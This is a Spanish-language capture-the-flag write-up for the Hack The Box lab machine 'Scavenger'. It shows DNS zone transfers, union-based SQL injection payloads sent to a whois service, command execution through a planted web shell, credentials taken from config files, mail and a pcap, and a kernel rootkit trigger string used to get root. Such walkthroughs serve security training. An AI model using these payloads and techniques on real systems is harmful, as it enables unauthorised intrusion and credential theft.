---
layout      : post
title       : "Maquina Scavenger - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Scavenger/banner.png
category    : [ hackthebox ]
tags        : [ Domain Zone Transfer, Sql inyection, ftp enumaration, Whois, Pcap analysis, rootkit ]
---

Hola de nuevo el dia de hoy vamos a resolver la máquina `Scavenger` de la plataforma de `hackthebox` correspondiente a una maquina `linux` de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo `whois`, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo `pcap` para descubrir un `rootkit` ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario `root`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Scavenger
❯ ls
 Scavenger
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.155
PING 10.10.10.155 (10.10.10.155) 56(84) bytes of data.
64 bytes from 10.10.10.155: icmp_seq=1 ttl=63 time=123 ms

--- 10.10.10.155 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.005/123.005/123.005/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63`correspondiente a una maquina `linux`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:11 GMT
Initiating SYN Stealth Scan at 22:11
Scanning 10.10.10.155 [65535 ports]
Discovered open port 22/tcp on 10.10.10.155
Discovered open port 21/tcp on 10.10.10.155
Discovered open port 80/tcp on 10.10.10.155
Discovered open port 53/tcp on 10.10.10.155
Discovered open port 43/tcp on 10.10.10.155
Completed SYN Stealth Scan at 22:12, 26.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.155
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-23 22:11:41 GMT for 26s
Not shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
43/tcp open  whois   syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 131040 (5.766MB) | Rcvd: 39 (2.604KB)
```

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p21,22,43,53,80 10.10.10.155 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:12 GMT
Nmap scan report for 10.10.10.155
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
43/tcp open  whois?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.00 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 21     | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.4p1 Debian 10+deb9u4 |
| 43   | WHOIS     | whois? |
| 53   | DNS     |ISC BIND 9.10.3-P4  |
| 80   | HTTP     |Apache httpd 2.4.25 |


## EXPLOTACION [#](#explotación) {#explotación}

Observamos un servicio web ejecutandose en el puerto `80` y en el puerto `43` obtenemos un dominio que vamos a proceder a añadir en nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.155 supersechosting.htb www.supersechosting.htb" >> /etc/hosts
```

Si ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.


![](/assets/images/HTB/htb-writeup-Scavenger/sca1.PNG)

![](/assets/images/HTB/htb-writeup-Scavenger/sca2.PNG)


Ahora ya que nmap tambien nos reporto que el puerto `53` se encuentra abierto asi que con la herramienta `dig` vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos.


```bash
❯ dig @10.10.10.155 supersechosting.htb axfr

; <<>> DiG 9.16.27-Debian <<>> @10.10.10.155 supersechosting.htb axfr
; (1 server found)
;; global options: +cmd
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
supersechosting.htb.	604800	IN	NS	ns1.supersechosting.htb.
supersechosting.htb.	604800	IN	MX	10 mail1.supersechosting.htb.
supersechosting.htb.	604800	IN	A	10.10.10.155
ftp.supersechosting.htb. 604800	IN	A	10.10.10.155
mail1.supersechosting.htb. 604800 IN	A	10.10.10.155
ns1.supersechosting.htb. 604800	IN	A	10.10.10.155
whois.supersechosting.htb. 604800 IN	A	10.10.10.155
www.supersechosting.htb. 604800	IN	A	10.10.10.155
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
;; Query time: 436 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:23:59 GMT 2023
;; XFR size: 10 records (messages 1, bytes 275)
```

Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.155 ftp.supersechosting.htb mail1.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb www.supersechosting.htb" >> /etc/hosts
```

Logramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando `php` y `mysql`, ademas tambien podemos ver información acerca de `whois` que curiosamente tiene expuesto la maquina.

![](/assets/images/HTB/htb-writeup-Scavenger/sca3.PNG)

Al conectarnos a `whois` a traves de telnet, vemos que utiliza como base de datos el servicio de `mariadb`.

```bash
❯ telnet 10.10.10.155 43
Trying 10.10.10.155...
Connected to 10.10.10.155.
Escape character is '^]'.
 
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
Connection closed by foreign host.
```

El servicio `WHOIS` siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible `SQLInjection` podría funcionar al consultar la base de datos.

```bash
❯ nc 10.10.10.155 43
'
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1
```

Mandamos una `'` en la consulta y vemos que recibimos un error de `sql`. 

```bash
❯ nc 10.10.10.155 43
') ORDER BY 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
```

Vamos a proceder a enumear la base de datos.

```bash
❯ nc 10.10.10.155 43
') UNION SELECT database(), 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
whois

❯ nc 10.10.10.155 43
') UNION SELECT table_name,2 from information_schema.tables where table_schema='whois'#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
customers

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 0,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
id^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 1,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
domain^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 2,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
data

❯ nc 10.10.10.155 43
') UNION SELECT domain, 2 FROM  customers#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 4 object
supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
```

Encontramos mas subdominios y entre ellos uno curioso `rentahacker.htb`, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio.

```bash
❯ dig @10.10.10.155 rentahacker.htb axfr

; <<>> DiG 9.16.27-Debian <<>> @10.10.10.155 rentahacker.htb axfr
; (1 server found)
;; global options: +cmd
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
rentahacker.htb.	604800	IN	A	10.10.10.155
mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
www.rentahacker.htb.	604800	IN	A	10.10.10.155
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
;; Query time: 443 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:49:07 GMT 2023
;; XFR size: 8 records (messages 1, bytes 251)
```

Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en `sec03.rentahacker.htb` con una imagen en relación a un hacker que ya nos da que pensar.

![](/assets/images/HTB/htb-writeup-Scavenger/sca4.PNG)


Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a `php`, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de `wfuzz`.

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000015:   302        0 L      0 W        0 Ch        "index"                                                                                                               
000000217:   200        57 L     340 W      4729 Ch     "signup"                                                                                                              
000000027:   302        0 L      0 W        0 Ch        "search"                                                                                                              
000000053:   200        57 L     339 W      4712 Ch     "login"                                                                                                               
000000685:   200        0 L      0 W        0 Ch        "core"                                                                                                                
000000190:   200        57 L     332 W      4667 Ch     "wiki"                                                                                                                
000001688:   200        0 L      0 W        0 Ch        "shell"
```

Encontramos un archivo con un nombre muy descriptivo `shell` que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con `wfuzz` igualmente podemos tratar de averiguarlo ejecutando un comando.

![](/assets/images/HTB/htb-writeup-Scavenger/sca5.PNG)


```bash
❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://sec03.rentahacker.htb/shell.php?FUZZ=whoami"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000012593:   200        1 L      1 W        8 Ch        "hidden"                                                                                                              
000014350:   200        0 L      0 W        0 Ch        "guildwars"                                                                                                           
```

Obtenemos que el nombre parametro corresponde a `hidden` y si lo validamos tenemos ejecución de comandos.

![](/assets/images/HTB/htb-writeup-Scavenger/sca6.PNG)

Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una `tty` sobre http.


* [tty_over_http.py](https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py)

Para usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.

![](/assets/images/HTB/htb-writeup-Scavenger/sca7.PNG)


```bash
❯ rlwrap python3 tty_over_http.py
whoami
> ib01c03
ls -l /home
> total 24
drwx------ 4 ib01c01 customers 4096 Sep  1  2021 ib01c01
drwx------ 3 ib01c02 customers 4096 Sep  1  2021 ib01c02
drwx------ 4 ib01c03 customers 4096 Sep  1  2021 ib01c03
dr-xrwx--- 3 ib01ftp support   4096 Dec 10  2018 ib01ftp
drwx------ 3 ib01www support   4096 Dec 10  2018 ib01www
drwx------ 2 support support   4096 Sep 13  2022 support
ls -l /home/ib01c03
> total 26576
-rw-r--r--  1 ib01c03 customers 16689687 Oct 17  2018 bugtracker.2.18.tgz
drwxr-xr-x 15 ib01c03 customers    12288 Dec 10  2018 sec03
-rw-r--r--  1 ib01c03 customers 10503584 Dec  6  2018 wordpress.tgz
drwxr-xr-x  5 ib01c03 customers     4096 Sep  1  2021 www
```

Vemos un archivo comprimido en `wordpress`, asi que podemos tratar de buscar el archivo `wp-config.php` que generalmente contiene credenciales.

```bash
find / -name wp-config.php 2>/dev/null
> /home/ib01c03/www/wp-config.php
cat /home/ib01c03/www/wp-config.php
> <?php
 The name of the database for WordPress /
define('DB_NAME', 'ib01c03');

 MySQL database username /
define('DB_USER', 'ib01c03');

 MySQL database password /
define('DB_PASSWORD', 'Thi$sh1tIsN0tGut');

 MySQL hostname /
define('DB_HOST', 'localhost');
```

Obtenemos unas credenciales validas pero que correspoden al mismo usuario `ib01c03`, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a `mail1.rentahacker.htb`, por ello podemos listar la ruta `/var/spool/mail` buscando información.

```bash
ls -l /var/spool/mail/*
> -rw-rw-r-- 1 root mail 1274 Dec 10  2018 /var/spool/mail/ib01c03
-rw-rw---- 1 root mail 1043 Dec 11  2018 /var/spool/mail/support
```

Vemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario `ib01ftp:YhgRt56_Ta`.


```bash
cat /var/spool/mail/ib01c03
> From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
Return-path: <support@ib01.supersechosting.htb>
Envelope-to: ib01c03@ib01.supersechosting.htb
Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
	(envelope-from <support@ib01.supersechosting.htb>)
	id 1gWRtI-0000ZK-8Q
	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
To: <ib01c03@ib01.supersechosting.htb>
Subject: Re: Please help! Site Defaced!
In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
	<E1gWRnN-0000XA-44@ib01.supersechosting.htb>
References: <E1gWRnN-0000XA-44@ib01.supersechosting.htb>
X-Mailer: mail (GNU Mailutils 3.1.1)
Message-Id: <E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb>
From: support <support@ib01.supersechosting.htb>
Date: Mon, 10 Dec 2018 21:10:56 +0100
X-IMAPbase: 1544472964 2
Status: O
X-UID: 1

>> Please we need your help. Our site has been defaced!
>> What we should do now?
>>
>> rentahacker.htb

Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
Please check if there is any strange file in your web root and upload it to the ftp server:
ftp.supersechosting.htb
user: ib01ftp
pass: YhgRt56_Ta

Thanks.
```

Como las credenciales estan asociadas a `ftp` y el puerto se encuentra abierto probamos a conectarnos.


```bash
❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
226 Directory send OK.
ftp> cd incidents
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
226 Directory send OK.
ftp> cd ib01c01
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
226 Directory send OK.
```

Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina.

```bash
ftp> binary on
200 Switching to Binary mode.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: ib01c01.access.log remote: ib01c01.access.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01.access.log (10427 bytes).
226 Transfer complete.
10427 bytes received in 0.45 secs (22.5332 kB/s)
local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
226 Transfer complete.
835084 bytes received in 4.99 secs (163.5452 kB/s)
local: notes.txt remote: notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notes.txt (173 bytes).
226 Transfer complete.
173 bytes received in 0.00 secs (861.9659 kB/s)
```

La nota nos da una pista.

```bash
❯ cat notes.txt
After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
```

Analizando la captura con `tshark` obtenemos una contraseña.

```bash
❯ tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tfields -e 'tcp.payload' | xxd -ps -r
Running as user "root" and group "root". This could be dangerous.
POST /admin530o6uisg/index.php?rand=1544475115839 HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&token=de267fd50b09d00b04cca76ff620b201
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
cache-control: no-cache
X-Requested-With: XMLHttpRequest
Content-Length: 195
ajax=1&token=&controller=AdminLogin&submitLogin=1&passwd=GetYouAH4t%21&email=pwnhats%40pwnhats.htb&redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index.php?controller=AdminCustomerThreads&token=8d8e4db864318da7655c7f2d8175815f HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
```

Si urldecodeamos la contraseña, obtemos que es equivalente a `GetYouAH4t!`.

```bash
❯ php --interactive
Interactive mode enabled

php > echo urldecode("GetYouAH4t%21");
GetYouAH4t!
php >
```

Como el propieatio de la captura era el usuario `ib01c01` vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida.

```bash
❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
```

Ahora proderemos a traernos y visualizar la primera flag `user.txt`.


```bash
❯ cat user.txt
e8dd26ca8a139f83116a1744aa6d1826
```


## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si bien examinamos por encima el archivo `pcap` con la ayuda de `tshark`, vamos a volver a examinarlo esta vez mediante `wireshark`.


Al abrirnos `wireshark`, vemos que en el archivo pcap existen peticiones `GET` a un archivo de nombre `root.c`.

![](/assets/images/HTB/htb-writeup-Scavenger/sca8.PNG)


Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en `C`.

![](/assets/images/HTB/htb-writeup-Scavenger/sca9.PNG)


Dentro del script, vemos una cadena `Got r00t`, que llama mucho la atención y podemos ponernos a pensar que se trata de un `rootkit` y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un `rootkit` y nos dice como podemos aprovecharnos de este.

* [https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)


Basicamente lo que hace es cargar un modulo llamado `root.ko` y al enviar la cadena `echo "g0tR0ot" > /dev/ttyR0; comando`, esta lo ejecutara como `root`.

Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de `rootkit` es el mismo, la cadena debe de ser distinta.

```bash
❯ rlwrap python3 tty_over_http.py
echo "g0tR0ot" > /dev/ttyR0; whoami
> ib01c03
```

Por ello necesitamos encontrar el `root.ko` que en principio es el que carga el `rootkit`.

Si nos volvemos a conectar como el usuario `ib01c01`, y listamos los archivo ocultos vemos uno inusual `...` y si ingresamos al directorio encontramos el `root.ko`.

```bash
❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    4 1001     1004         4096 Sep 01  2021 .
drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
lrwxrwxrwx    1 0        0               9 Sep 01  2021 .bash_history -> /dev/null
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
226 Directory send OK.
ftp> 
```

Vamos a traernos el archivo y examinarlo con nuestra maquina con `radare2`.

```bash
ftp> get root.ko
local: root.ko remote: root.ko
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.ko (399400 bytes).
226 Transfer complete.
399400 bytes received in 3.94 secs (98.9888 kB/s)
ftp> quit
```

```bash
❯ radare2 root.ko
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- give | and > a try piping and redirection
[0x08000070]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08000070]> afl
0x08000070    1 8            sym.root_open
0x08000080    1 9            sym.root_read
0x08000090   11 359          sym.root_write
0x080001f7    7 292          sym.root_init
0x0800031b    1 82           sym.root_exit
[0x08000070]> s sym.root_write
[0x08000090]> pdf
```

Al examinarlo vemos que la cadena `g0tR0ot` fue reemplaza por la cadena en dos partes `g3tPr1v`, asi que vamos a probar mandando esta nueva cadena.

![](/assets/images/HTB/htb-writeup-Scavenger/sca10.PNG)

```bash
❯ rlwrap python3 tty_over_http.py
echo "g3tPr1v" > /dev/ttyR0; whoami
> root
```

Esta vez vemos que el `rootkit` si funciona, asi que ahora que tenemos privilegios como `root` solo nos quedaria visualizar la segunda flag `root.txt`.

```bash
echo "g3tPr1v" > /dev/ttyR0; cat /root/root.txt
> 8c1482a3a42eb925f6e2a6ed49535065
```


